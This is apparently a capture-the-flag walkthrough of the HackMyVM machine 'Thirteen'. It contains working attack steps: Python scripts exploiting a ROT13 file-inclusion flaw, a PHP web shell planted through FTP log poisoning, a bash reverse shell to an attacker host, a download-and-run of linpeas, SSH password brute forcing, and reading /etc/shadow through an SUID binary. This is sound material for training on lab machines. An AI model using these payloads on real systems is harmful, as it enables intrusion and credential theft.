# Thirteen

## Recon

![writeup.png](/assets/pentest/hackmyvm/thirteen/writeup.png)

::: details nmap_scan.log
```log
Open 10.0.2.25:80
Open 10.0.2.25:21
Open 10.0.2.25:22
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.25

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack pyftpdlib 2.0.1
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 10.0.2.25:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
80/tcp open  http    syn-ack Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: iCloud Vault Access
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

> Optionally add DNS record for simplicity.

## HTTP (80)

Can't probe FTP, so let's target HTTP then
```bash
└─$ ftp anonymous@13max.hmv
Connected to 13max.hmv.
220 pyftpdlib 2.0.1 ready.
331 Username ok, send password.
Password:
530 Anonymous access not allowed.
ftp: Login failed
```

![writeup-1.png](/assets/pentest/hackmyvm/thirteen/writeup-1.png)

We don't have any tokens, but can view some files. The access is especially odd, my first thought was ROT13

![writeup-2.png](/assets/pentest/hackmyvm/thirteen/writeup-2.png)

### LFI

The files are accessible via ROT13-fied filenames.

![writeup-3.png](/assets/pentest/hackmyvm/thirteen/writeup-3.png)

```python
from requests import Session
from pathlib import Path
from codecs import encode
from cmd import Cmd

URL = "http://13max.hmv"
OUTPUT = Path("output")
OUTPUT.mkdir(exist_ok=True)

class RemoteShell(Cmd):
    intro = "Remote ROT13 downloader shell. Type help or ? to list commands."
    prompt = "!> "

    def __init__(self):
        super().__init__()
        self.session = Session()

    def fetch_file(self, filename: str) -> bytes:
        encoded = encode(filename, "rot_13")
        response = self.session.get(URL, params={"theme": encoded})
        if b'iCloud Vault Access' in response.content:
            return b"File not found"
        response.raise_for_status()
        return response.content[122:-7]

    def do_cat(self, arg):
        """cat <filename> -- View contents of a remote file"""
        if not arg:
            print("Usage: cat <filename>")
            return
        
        try:
            data = self.fetch_file(arg)
            try:
                print(data.decode(errors="replace"))
            except Exception as e:
                print(f"[!] Error decoding file: {e}")
        except Exception as e:
            print(f"[!] Failed to fetch file: {e}")

    def do_download(self, arg):
        """download <filename> -- Save remote file to output/"""
        if not arg:
            print("Usage: download <filename>")
            return
        
        try:
            data = self.fetch_file(arg)
            path = OUTPUT / Path(arg).name
            with open(path, "wb") as f:
                f.write(data)
            print(f"[+] Downloaded {arg} -> {path}")
        except Exception as e:
            print(f"[!] Failed to download file: {e}")

    def do_exit(self, arg):
        """Exit the shell"""
        print("Exiting.")
        return True

    def do_EOF(self, arg):
        """Handle Ctrl+D"""
        return self.do_exit(arg)


if __name__ == "__main__":
    RemoteShell().cmdloop()
```

Nothing from this process.
```bash
!> cat /proc/self/cmdline
/usr/sbin/apache2-kstart
!> cat /proc/self/environ

```

## FTP (21)

Readme mentioned something about changing credentials before deploying, we could target weak passwords with `welcome.txt` usernames but that's low hanging fruit.

We can enumerate what other processes are running via fuzzing `/proc/PID/cmdline`
```python
from codecs import encode
from requests import Session

URL = "http://13max.hmv"

def fetch_file(session, filename):
    encoded = encode(filename, "rot_13")
    response = session.get(URL, params={"theme": encoded})
    if 'iCloud Vault Access' in response.text:
        return ''
    response.raise_for_status()
    return response.text[122:-7]

with Session() as session:
    for i in range(1000):
        resp = fetch_file(session, f"/proc/{i}/cmdline")
        if not resp: continue
        print(f'[{i:03d}] {resp}')
```

```bash
[001] /sbin/init
[229] /lib/systemd/systemd-journald
[248] /lib/systemd/systemd-udevd
[306] /lib/systemd/systemd-timesyncd
[327] /sbin/dhclient-4-v-i-pf/run/dhclient.enp0s3.pid-lf/var/lib/dhcp/dhclient.enp0s3.leases-I-df/var/lib/dhcp/dhclient6.enp0s3.leasesenp0s3
[395] /usr/sbin/cron-f
[396] /lib/systemd/systemd-timesyncd
[397] /usr/bin/dbus-daemon--system--address=systemd:--nofork--nopidfile--systemd-activation--syslog-only
[398] /usr/bin/python3/opt/ftp_server.py
[400] /usr/sbin/rsyslogd-n-iNONE
[405] /usr/sbin/rsyslogd-n-iNONE
[406] /usr/sbin/rsyslogd-n-iNONE
[408] /usr/sbin/rsyslogd-n-iNONE
[410] /lib/systemd/systemd-logind
[418] /sbin/agetty-o-p -- \u--nocleartty1linux
[424] sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
[432] /usr/sbin/apache2-kstart
[434] /usr/bin/python3/usr/share/unattended-upgrades/unattended-upgrade-shutdown--wait-for-signal
[454] /usr/bin/python3/usr/share/unattended-upgrades/unattended-upgrade-shutdown--wait-for-signal
[885] /usr/sbin/apache2-kstart
[923] /usr/sbin/apache2-kstart
[927] /usr/sbin/apache2-kstart
[929] /usr/sbin/apache2-kstart
[948] /usr/sbin/apache2-kstart
[953] /usr/sbin/apache2-kstart
[955] /usr/sbin/apache2-kstart
[964] /usr/sbin/apache2-kstart
[968] /usr/sbin/apache2-kstart
[982] /usr/sbin/apache2-kstart
```

```python
!> cat /opt/ftp_server.py
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
from pyftpdlib.authorizers import DummyAuthorizer
import logging
import os

LOG_DIR = "/var/www/html/logs"
LOG_FILE = os.path.join(LOG_DIR, "ftp_server.log")

os.makedirs(LOG_DIR, exist_ok=True)
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class CustomFTPHandler(FTPHandler):
    def on_connect(self): logging.info(f"Connection from {self.remote_ip}:{self.remote_port}")
    def on_disconnect(self): logging.info(f"Disconnected {self.remote_ip}:{self.remote_port}")
    def on_login(self, username): logging.info(f"User logged in: {username}")
    def on_logout(self, username): logging.info(f"User logged out: {username}")
    def on_file_sent(self, file): logging.info(f"File sent: {file}")
    def on_file_received(self, file): logging.info(f"File received: {file}")
    def on_incomplete_file_sent(self, file): logging.warning(f"Incomplete file sent: {file}")
    def on_incomplete_file_received(self, file): logging.warning(f"Incomplete file received: {file}")

def main():
    authorizer = DummyAuthorizer()
    authorizer.add_user("ADMIN", "12345", ".", perm="elradfmw")

    handler = CustomFTPHandler
    handler.authorizer = authorizer

    address = ("0.0.0.0", 21)
    server = FTPServer(address, handler)

    print(f"Starting FTP server on {address[0]}:{address[1]}, logging to {LOG_FILE}")
    server.serve_forever()

if __name__ == "__main__":
    main()
```

We can inspect the log file, but there's nothing too interesting. It contains `phpinfo()` but doesn't help with lateral movement. 
```bash
!> download ./logs/ftp_server.log
[+] Downloaded ./logs/ftp_server.log -> output/ftp_server.log
```

The FTP service seems to be the key, however we can't do much.
- We know that files are uploaded in `/opt`
- We know that FTP server exists in `/opt`
- We have access to FTP with full access

We can overwrite the script and wait for it to get updated, however by default that will take ages unless there's a cronjob which restarts it after some period of time, or we need it to crash so it can restart.

### LFI -> RCE

With LFI it's possible to execute PHP

![writeup-4.png](/assets/pentest/hackmyvm/thirteen/writeup-4.png)

| Directive         | Local Value                                        | Master Value                                       |
| ----------------- | -------------------------------------------------- | -------------------------------------------------- |
| disable_functions | system,passthru,shell_exec,proc_open,pcntl_exec,dl | system,passthru,shell_exec,proc_open,pcntl_exec,dl |

[https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/index.html](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/index.html)

```bash
└─$ ftp 13max.hmv
...
Name (13max.hmv:woyag): <?php echo exec($_REQUEST[0]); ?>
...
└─$ curl 'http://13max.hmv/?theme=ybtf/sgc_freire.ybt&0=id' -s | grep uid
2025-08-27 10:40:11,839 - INFO - 10.0.2.15:50834-[] USER 'uid=33(www-data) gid=33(www-data) groups=33(www-data)' failed login.
```

## Reverse Shell

```
└─$ curl 'http://13max.hmv/?theme=ybtf/sgc_freire.ybt' -G --data-urlencode '0=/bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"' -s

└─$ listen
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.2.25:42366.
bash: cannot set terminal process group (416): Inappropriate ioctl for device
bash: no job control in this shell
www-data@13max:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
www-data@13max:/home$ find . -type f -ls
find: './welcome/.local/share': Permission denied
   527366      4 -rw-r--r--   1 welcome  welcome       220 Apr 11 22:27 ./welcome/.bash_logout
   527367      4 -rw-r--r--   1 welcome  welcome      3526 Apr 11 22:27 ./welcome/.bashrc
   527407      4 -rw-r--r--   1 welcome  welcome        44 Jul  5 02:54 ./welcome/user.flag
   527368      4 -rw-r--r--   1 welcome  welcome       807 Apr 11 22:27 ./welcome/.profile
   527401      4 -rw-r--r--   1 max      max           220 Apr 18  2019 ./max/.bash_logout
   527402      4 -rw-r--r--   1 max      max          3526 Apr 18  2019 ./max/.bashrc
   527408      4 -rw-r--r--   1 max      max           315 Jul  4 10:30 ./max/.hint/.pucc
   527403      4 -rw-r--r--   1 max      max           807 Apr 18  2019 ./max/.profile
www-data@13max:/home$ cat ./max/.hint/.pucc
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]
```

Enumerate with linpeas for more context, curl or wget doesn't exist btw.
```bash
www-data@13max:/var/www/html$ php -r 'echo file_get_contents("http://10.0.2.15/lp.sh");' | bash | tee /tmp/lp.log
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strace Not Found
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 47K Apr  6  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 63K Apr  6  2024 /usr/bin/su
-rwsr-xr-x 1 root root 35K Apr  6  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 23K Jan 13  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 179K Jan 14  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-sr-- 1 root welcome 158K Jul  4 10:37 /usr/local/bin/supersuid (Unknown SUID binary!)
-rwsr-xr-- 1 root messagebus 51K Jun  6  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 471K Dec 21  2023 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 19K Jan 13  2022 /usr/libexec/polkit-agent-helper-1
...

www-data@13max:/var/www/html$ supersuid
bash: /usr/local/bin/supersuid: Permission denied
```

We need to become `welcome` user as it seems.

## Password Bruteforce

Using the `hint` tool we are able to login.
```bash
└─$ git clone https://github.com/Mebus/cupp.git
└─$ curl 13max.hmv/welcome.txt -sO
└─$ py cupp/cupp.py -w welcome.txt # Spam enter
└─$ hydra -L users.txt -P welcome.txt.cupp.txt 13max.hmv ssh
[22][ssh] host: 13max.hmv   login: max   password: Ellyas2018
[22][ssh] host: 13max.hmv   login: welcome   password: Zakaria2020
```

## SSH (22)

```bash
sshpass -p Ellyas2018 ssh max@13max.hmv
sshpass -p Zakaria2020 ssh welcome@13max.hmv
```

Welcome user is more desirable since they have SUID binary
```bash
└─$ sshpass -p Zakaria2020 ssh welcome@13max.hmv
welcome@13max:~$ md5sum user.flag
87723b59f36430f38cb0dc94fb4de743  user.flag
```

## Privilege Escalation (root)

```bash
welcome@13max:~$ supersuid -h
Usage: ss [ OPTIONS ]
```

[https://gtfobins.github.io/gtfobins/ss](https://gtfobins.github.io/gtfobins/ss)

```bash
welcome@13max:~$ supersuid -a -F /etc/shadow
Error: an inet prefix is expected rather than "root:$6$Cax26XI4SpAAItdE$7iVSsRoQT/o0b3.V9jMiljdau506ePGmZLkIl5JH9COngDqdXJkGnizRIhaLJu/JbwWZ.7XyF/MwzuDusZJcg1:20273:0:99999:7::".
Cannot parse dst/src address.
```

```powershell
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
...
april7th         (?)
1g 0:00:00:49 DONE (2025-08-27 19:27) 0.02030g/s 3846p/s 3846c/s 3846C/s becky101..Saints1
```

```bash
welcome@13max:~$ su - root
Password: april7th
root@13max:~# id
uid=0(root) gid=0(root) groups=0(root)
root@13max:~# md5sum /root/root.flag
2ca685275b2d3e4e00c945e3f19e199e  /root/root.flag
```